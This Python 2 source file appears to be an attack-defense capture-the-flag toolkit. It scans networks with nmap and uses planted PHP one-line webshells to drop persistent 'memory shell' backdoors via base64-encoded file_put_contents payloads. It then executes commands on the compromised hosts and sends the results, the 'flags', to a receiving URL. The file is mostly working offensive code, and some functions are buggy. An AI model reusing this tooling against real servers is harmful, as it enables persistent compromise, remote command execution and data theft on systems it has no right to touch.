#-*- coding:utf-8 -*-
import nmap
from db import *
import os
import threading
import requests
import re
import time
import sched




def live_host(ips, server):
    module_path = os.path.dirname(__file__)
    file_name = module_path+'/file/hosts/ips.txt'
    hosts = open(file_name, 'a')
    nm = nmap.PortScanner()
    nm.scan(hosts=ips, arguments="-sP")
    hosts_list = [x for x in nm.all_hosts()]
    for host in hosts_list:
        add_target(server, host)
        #print host
        line = "{}:{}".format(server,host)
        hosts.write(line + '\n')
    hosts.write('------'+time.strftime("%H:%M:%S", time.localtime())+'------')
    hosts.close()
    return True

def port_scan():
    module_path = os.path.dirname(__file__)
    ips = []
    allip = Target.query.all()
    for i in allip:
        ips.append(i['ip'])
    nm = nmap.PortScanner()
    for ip in ips:
        try:
            status = requests.get(url="http://"+ip, timeout=0.5).status_code
        except:
            status = 404
        if status == 200:
            nm.scan(ip, '22-443')
            print nm.csv()
        else:
            print "{} offline".format(ip)


def send_memoryshell(url,pwd,shell_path,shell_code):
    shell_ip = re.findall(r'http://(.+?)/.*', url)[0]
    shell_url = 'http://' + shell_ip + shell_path[1:]
    code = shell_code.encode('base64')[:-1]
    data = {pwd: "file_put_contents(\"{}\",base64_decode(\"".format(shell_path) + code + "\"));"}
    requests.post(url=url, data=data)
    try:
        requests.get(url=shell_url,timeout=0.2)
    except:
        return

def get_all_urls(server):
    return get_shell_urls(server)


def one_key_shell(server, pwd, shell_path):
    urls = get_all_urls(server)     #获取一句话的url
    for url in urls:
        shell_ip = re.findall(r'http://(.+?)/.*', url)[0]
        shell_url = 'http://' + shell_ip + shell_path[1:]
        module_path = os.path.dirname(__file__)
        memory_shell_path = module_path + '/file/shell/memory_shell.php'
        code = open(memory_shell_path,"r").read()
        send_memoryshell(url, pwd, shell_path, code)
        update_shell_status(shell_url, 'control')   #写入表，更新状态

def do_background(func, *args):
    thread = threading.Thread(target=func, args= args)
    thread.start()
    return True

def test_live(s,second):        #主机在线检测
    ips = db.session.query(Target.ip).all()
    for i in range(len(ips)):
        ips[i] = ips[i][0]

    for ip in ips:
        url = 'http://' + ip
        try:
            test = requests.get(url=url, timeout=0.5)
            if test.status_code == 200:
                update_target_status(ip, 'online')
        except:
            update_target_status(ip, 'offline')
    s.enter(second, 1, test_live,(s,second))

def shell_status(s,second):         #内存马状态检测
    urls = db.session.query(Shell_control.shell).all()
    for i in range(len(urls)):
        urls[i] = urls[i][0]
    for url in urls:
        try:
            test = requests.get(url=url, timeout=0.5)
            if test.status_code == 200:
                update_shell_status(url, 'control')
        except:
            update_shell_status(url, 'not control')
    s.enter(second, 1, shell_status, (s, second))

def cycle_do(second,func):     #定时任务
    s = sched.scheduler(time.time, time.sleep)
    s.enter(second, 1, func,(s,second))
    s.run()

def send_bshell(ip,bshell,path):
    url = Shell_control.query.filter_by(ip=ip).first()
    module_path = os.path.dirname(__file__)
    bshell = module_path + '/file/shell/' + bshell
    bshell_path = path[1:]
    code = open(bshell,'r')
    if url:
        post_url = url['shell']
        data = {'sksec': "file_put_contents(\"{}\",\"".format(bshell_path) + code + "\");"}
        try:
            send = requests.post(url=post_url,data=data)
            if send.status_code == 200:
                return 'ok'
            else:
                return 'fails'
        except:
            return 'fails'



def get_flag_1(url,command):
    data = {'sksec':command}
    flag = requests.post(url=url,data=data)
    return flag

def send_flag_1(command,receive_url):
    shells = Shell_control.query.all()
    for i in range(len(shells)):
        shells[i] = shells[i]['shell']
    for shell in shells:
        flag = get_flag_1(shell,command)
        url = receive_url.replace("$flag$",flag)    #替换默认格式
        requests.get(url=url)                       #get方式发送flag（可以改）

def send_flag_2(command):   #命令一把梭|思考更好的解决办法
    shells = Shell_control.query.all()
    for i in range(len(shells)):
        shells[i] = shells[i]['shell']
    for shell in shells:
        data={'sksec':command}
        requests.get(url=shells,data=data)
